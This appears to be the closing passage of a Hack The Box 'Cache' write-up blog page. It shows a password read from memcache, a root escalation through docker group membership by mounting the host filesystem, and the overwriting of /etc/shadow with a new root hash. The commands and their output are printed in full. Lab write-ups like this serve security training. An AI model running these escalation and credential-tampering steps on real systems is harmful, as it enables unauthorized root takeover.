+<span class="code-line">ITEM account [9 b; 0 s]</span>
+<span class="code-line">END</span>
+<span class="code-line">get user</span>
+<span class="code-line">VALUE user 0 5</span>
+<span class="code-line">luffy</span>
+<span class="code-line">END</span>
+<span class="code-line">get passwd</span>
+<span class="code-line">VALUE passwd 0 9</span>
+<span class="code-line">0n3_p1ec3</span>
+<span class="code-line">END</span>
+<span class="code-line"></code></pre></div>
+
+<p>We get back to an interactive shell and switch user to <code>luffy</code>. We quickly
+identify that we belong to the <code>docker</code> group and display the <code>docker</code> version.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ su luffy</span>
+<span class="code-line">su luffy</span>
+<span class="code-line">Password: 0n3_p1ec3</span>
+<span class="code-line"></span>
+<span class="code-line">luffy@cache:/var/www/hms.htb/public_html/interface/main$ id</span>
+<span class="code-line">id</span>
+<span class="code-line">uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)</span>
+<span class="code-line"></span>
+<span class="code-line">luffy@cache:/var/www/hms.htb/public_html/interface/main$ docker --version</span>
+<span class="code-line">docker --version</span>
+<span class="code-line">Docker version 18.09.1, build 4c52b90</span>
+<span class="code-line"></code></pre></div>
+
+<p>We use <code>searchsploit</code> again but th listed one is destructive.</p>
+<p>A few Google search lead us to
+<a href="https://www.hackingarticles.in/docker-privilege-escalation/">another article</a>
+explaining how you can get a full access to the host system by mounting it into
+the docker machine. We quickly list the available images. Only a <code>ubuntu</code> is
+available.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>luffy@cache:/var/www/hms.htb/public_html/interface/main$ docker image ls</span>
+<span class="code-line">docker image ls</span>
+<span class="code-line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span>
+<span class="code-line">ubuntu              latest              2ca708c1c9cc        7 months ago        64.2MB</span>
+<span class="code-line"></code></pre></div>
+
+<p>We mount <code>/root/</code> into our docker machine and that allow us to get the
+<code>root.txt</code> flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>luffy@cache:~/.plop$ docker run -v /root/:/mnt -it ubuntu</span>
+<span class="code-line">docker run -v /root/:/mnt -it ubuntu</span>
+<span class="code-line">root@884f0f892e34:/#ls /mnt</span>
+<span class="code-line">ls /mnt</span>
+<span class="code-line">root.txt</span>
+<span class="code-line">root@884f0f892e34:/# cat /mnt/root.txt</span>
+<span class="code-line">cat /mnt/root.txt</span>
+<span class="code-line">da8b94288d919f4c6089fccdaa318832</span>
+<span class="code-line"></code></pre></div>
+
+<p>We could also have mounted the whole file system <code>/</code> and get the content of
+<code>/etc/shadow</code> to crack the root password. Or even rewrite the root password in <code>/etc/shadow</code>.</p>
+<p>Another docker trick is to <code>chroot</code> into the mounted folder to get a root to
+directly get a shell on the system: <code>docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh</code></p>
+<p>We can then generate a new password using <code>perl</code></p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># perl -e &#39;print crypt(&quot;password&quot;,&quot;\$6\$saltsalt\$&quot;) . &quot;\n&quot;&#39;</span>
+<span class="code-line">perl -e &#39;print crypt(&quot;password&quot;,&quot;\$6\$saltsalt\$&quot;) . &quot;\n&quot;&#39;</span>
+<span class="code-line">$6$saltsalt$qFmFH.bQmmtXzyBY0s9v7Oicd2z4XSIecDzlB5KiA2/jctKu9YterLp8wwnSq.qc.eoxqOmSuNp2xS0ktL3nh/</span>
+<span class="code-line"></code></pre></div>
+
+<p>And then put the new hash value in a new file <code>/etc/shadow.new</code>, check it and
+then replace the original <code>/etc/shadow</code> file. One the new value is set we can
+exit the docker and switch user to root.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># perl -pe &#39;s|(root):(\$.*?:)|\1:\$6\$SALTsalt\$UiZikbV3VeeBPsg8./Q5DAfq9aj7CVZMDU6ffBiBLgUEpxv7LMXKbcZ9JSZnYDrZQftdG319XkbLVMvWcF/Vr/:|&#39; /etc/shadow &gt; /etc/shadow.new</span>
+<span class="code-line">perl -pe &#39;s|(root):(\$.*?:)|\1:\$6\$SALTsalt\$UiZikbV3VeeBPsg8./Q5DAfq9aj7CVZMDU6ffBiBLgUEpxv7LMXKbcZ9JSZnYDrZQftdG319XkbLVMvWcF/Vr/:|&#39; /etc/shadow &gt; /etc/shadow.new</span>
+<span class="code-line"># cat /etc/shadow.new</span>
+<span class="code-line">cat /etc/shadow.new</span>
+<span class="code-line">root:$6$SALTsalt$UiZikbV3VeeBPsg8./Q5DAfq9aj7CVZMDU6ffBiBLgUEpxv7LMXKbcZ9JSZnYDrZQftdG319XkbLVMvWcF/Vr/:18178:0:99999:7:::</span>
+<span class="code-line">daemon:*:17941:0:99999:7:::</span>
+<span class="code-line">bin:*:17941:0:99999:7:::</span>
+<span class="code-line">sys:*:17941:0:99999:7:::</span>
+<span class="code-line">sync:*:17941:0:99999:7:::</span>
+<span class="code-line">games:*:17941:0:99999:7:::</span>
+<span class="code-line">man:*:17941:0:99999:7:::</span>
+<span class="code-line">lp:*:17941:0:99999:7:::</span>
+<span class="code-line">mail:*:17941:0:99999:7:::</span>
+<span class="code-line">news:*:17941:0:99999:7:::</span>
+<span class="code-line">uucp:*:17941:0:99999:7:::</span>
+<span class="code-line">proxy:*:17941:0:99999:7:::</span>
+<span class="code-line">www-data:*:17941:0:99999:7:::</span>
+<span class="code-line">backup:*:17941:0:99999:7:::</span>
+<span class="code-line">list:*:17941:0:99999:7:::</span>
+<span class="code-line">irc:*:17941:0:99999:7:::</span>
+<span class="code-line">gnats:*:17941:0:99999:7:::</span>
+<span class="code-line">nobody:*:17941:0:99999:7:::</span>
+<span class="code-line">systemd-network:*:17941:0:99999:7:::</span>
+<span class="code-line">systemd-resolve:*:17941:0:99999:7:::</span>
+<span class="code-line">syslog:*:17941:0:99999:7:::</span>
+<span class="code-line">messagebus:*:17941:0:99999:7:::</span>
+<span class="code-line">_apt:*:17941:0:99999:7:::</span>
+<span class="code-line">lxd:*:17941:0:99999:7:::</span>
+<span class="code-line">uuidd:*:17941:0:99999:7:::</span>
+<span class="code-line">dnsmasq:*:17941:0:99999:7:::</span>
+<span class="code-line">landscape:*:17941:0:99999:7:::</span>
+<span class="code-line">pollinate:*:17941:0:99999:7:::</span>
+<span class="code-line">sshd:*:18156:0:99999:7:::</span>
+<span class="code-line">ash:$6$xXLd6jlN$b37bISaMTwk2uxlpOsRFlJYmNMzFPlSb.7nD2oSzhjtdikwne5j17lAtfwKP0jyfaScDgLKFn9gyPvxg57NcS.:18157:0:99999:7:::</span>
+<span class="code-line">luffy:$6$aPEHFC8D$9ZWqYH2UuImmKRLWA7ZBzSWiBiGLUmXCn7BBpcFq5quVXIj6mA0QtiGwH8opTZ53AzpgnPhaOGq4i1SaRlBlP/:18157:0:99999:7:::</span>
+<span class="code-line">memcache:!:18157:0:99999:7:::</span>
+<span class="code-line">mysql:!:18219:0:99999:7:::</span>
+<span class="code-line"># mv /etc/shadow.new /etc/shadow    </span>
+<span class="code-line">mv /etc/shadow.new /etc/shadow</span>
+<span class="code-line"># exit</span>
+<span class="code-line">exit</span>
+<span class="code-line">luffy@cache:~$ su</span>
+<span class="code-line">su</span>
+<span class="code-line">Password: password</span>
+<span class="code-line"></span>
+<span class="code-line">root@cache:/home/luffy#</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>The box was overall interesting. The root part was really nice as it chained the
+memcache "exploitation" and the "docker" one.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2020/09/htb-admirer.html"> HTB: Admirer </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2020/10/htb-blunder.html"> HTB: Blunder </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
